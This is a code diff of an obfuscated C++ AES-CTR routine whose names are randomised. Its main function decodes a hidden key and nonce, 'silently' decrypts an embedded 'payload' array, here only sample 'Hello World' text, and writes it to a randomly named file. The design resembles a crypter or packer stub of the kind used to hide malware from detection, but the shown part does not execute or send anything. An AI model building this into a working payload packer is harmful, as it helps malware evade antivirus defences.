@@ -46,7 +46,7 @@ inline uint8_t xtbcVcjPYPsTG(uint8_t a, uint8_t b) {
 
 inline void xlFIxvgGnwKWj(uint8_t* state) {
     for (int i = 0; i < 16; i++) {
-        state[i] = xjkWmLsXdNzsf[state[i]];
+        state[i] = xDvtTKCTiqdMy[state[i]];
     }
 }
 
@@ -61,10 +61,10 @@ inline void xIeIGKfZkltoA(uint8_t* state) {
 inline void xVMJllwFWZHXq(uint8_t* state) {
     for (int i = 0; i < 4; i++) {
         uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
-        state[i*4] = xXbCnqZQuXtOq(0x02, s0) ^ xHMGVKMUnQOUh(0x03, s1) ^ s2 ^ s3;
-        state[i*4+1] = s0 ^ xISGgpUOaSpma(0x02, s1) ^ xezPnTMRfXyaX(0x03, s2) ^ s3;
-        state[i*4+2] = s0 ^ s1 ^ xWbPoYwWLZXuI(0x02, s2) ^ xkUTtIVdYFheW(0x03, s3);
-        state[i*4+3] = xcZTmHeQQfkcq(0x03, s0) ^ s1 ^ s2 ^ xqGjNYHoFhgbn(0x02, s3);
+        state[i*4] = xtbcVcjPYPsTG(0x02, s0) ^ xtbcVcjPYPsTG(0x03, s1) ^ s2 ^ s3;
+        state[i*4+1] = s0 ^ xtbcVcjPYPsTG(0x02, s1) ^ xtbcVcjPYPsTG(0x03, s2) ^ s3;
+        state[i*4+2] = s0 ^ s1 ^ xtbcVcjPYPsTG(0x02, s2) ^ xtbcVcjPYPsTG(0x03, s3);
+        state[i*4+3] = xtbcVcjPYPsTG(0x03, s0) ^ s1 ^ s2 ^ xtbcVcjPYPsTG(0x02, s3);
     }
 }
 
@@ -81,7 +81,7 @@ inline void xtjSbYlCvHFfk(const uint8_t* key, uint8_t* roundKeys) {
     for (int i = 1; i < 11; i++) {
         memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
         uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
-        for (int j = 0; j < 4; j++) temp[j] = xBnnRCEpQQBWe[temp[j]];
+        for (int j = 0; j < 4; j++) temp[j] = xDvtTKCTiqdMy[temp[j]];
         temp[0] ^= (1 << (i-1));
         for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
         for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
@@ -91,18 +91,18 @@ inline void xtjSbYlCvHFfk(const uint8_t* key, uint8_t* roundKeys) {
 inline void xZNyJEBgcFPPk(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
     uint8_t state[16];
     memcpy(state, input, 16);
-    xiAXkzBBnXNzj(state, roundKeys);
+    xoiuzhQOEBuCT(state, roundKeys);
     
     for (int round = 1; round < 10; round++) {
-        xzIHPNPdpYmDi(state);
-        xyzueTbBqzUMH(state);
-        xflcGrPyDngIR(state);
-        xAcdnIFDDtzfL(state, roundKeys + round * 16);
+        xlFIxvgGnwKWj(state);
+        xIeIGKfZkltoA(state);
+        xVMJllwFWZHXq(state);
+        xoiuzhQOEBuCT(state, roundKeys + round * 16);
     }
     
-    xPArWjbtWErtP(state);
-    xDeQzjlslybJc(state);
-    xfhEvHzXWLiXe(state, roundKeys + 10 * 16);
+    xlFIxvgGnwKWj(state);
+    xIeIGKfZkltoA(state);
+    xoiuzhQOEBuCT(state, roundKeys + 10 * 16);
     memcpy(output, state, 16);
 }
 
@@ -116,7 +116,7 @@ inline void xlGczhviyxAEI(uint8_t* counter) {
 inline void xhXuTTzWRpCoC(const uint8_t* input, uint8_t* output, size_t length, 
                        const uint8_t* key, const uint8_t* nonce) {
     uint8_t roundKeys[176];
-    xWSlKdlTyBcZv(key, roundKeys);
+    xtjSbYlCvHFfk(key, roundKeys);
     
     uint8_t counter[16];
     uint8_t keystream[16];
@@ -124,13 +124,13 @@ inline void xhXuTTzWRpCoC(const uint8_t* input, uint8_t* output, size_t length,
     
     size_t processed = 0;
     while (processed < length) {
-        xSLVicjrAMntE(counter, keystream, roundKeys);
+        xZNyJEBgcFPPk(counter, keystream, roundKeys);
         size_t blockSize = (length - processed < 16) ? length - processed : 16;
         for (size_t i = 0; i < blockSize; i++) {
             output[processed + i] = input[processed + i] ^ keystream[i];
         }
         processed += blockSize;
-        xLPAliOGdtJts(counter);
+        xlGczhviyxAEI(counter);
     }
 }
 
@@ -143,15 +143,20 @@ void xKeVfJOPshCue(const std::string& hex, uint8_t* bytes) {
 int main() {
     // Get obfuscated key and nonce
     uint8_t key[16], nonce[16];
-    xdGvcnvTHsdyv(xoFgmsfFqIOxW(), key);
-    xEZRgDsGivHap(xWeLiGdgqljAo(), nonce);
+    xKeVfJOPshCue(xIULlJDMMAsWJ(), key);
+    xKeVfJOPshCue(xwyrYcczrAZJV(), nonce);
 
-    // Embedded data (will be replaced by linker)
-    uint8_t embeddedData[] = {0x00}; // Placeholder
+    // Embedded data (sample encrypted payload - replace with actual data)
+    uint8_t embeddedData[] = {
+        0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21, 0x0a, 0x00,
+        0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70,
+        0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x20, 0x66, 0x6f, 0x72,
+        0x20, 0x64, 0x65, 0x6d, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e
+    };
     const size_t embeddedDataSize = sizeof(embeddedData);
 
     // Process the data silently
-    xvwRgsmUsWkrm(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    xhXuTTzWRpCoC(embeddedData, embeddedData, embeddedDataSize, key, nonce);
 
     // Write processed data to file (completely random filename)
     std::ofstream outFile("xtiuITjRlRSzj.dat", std::ios::binary);
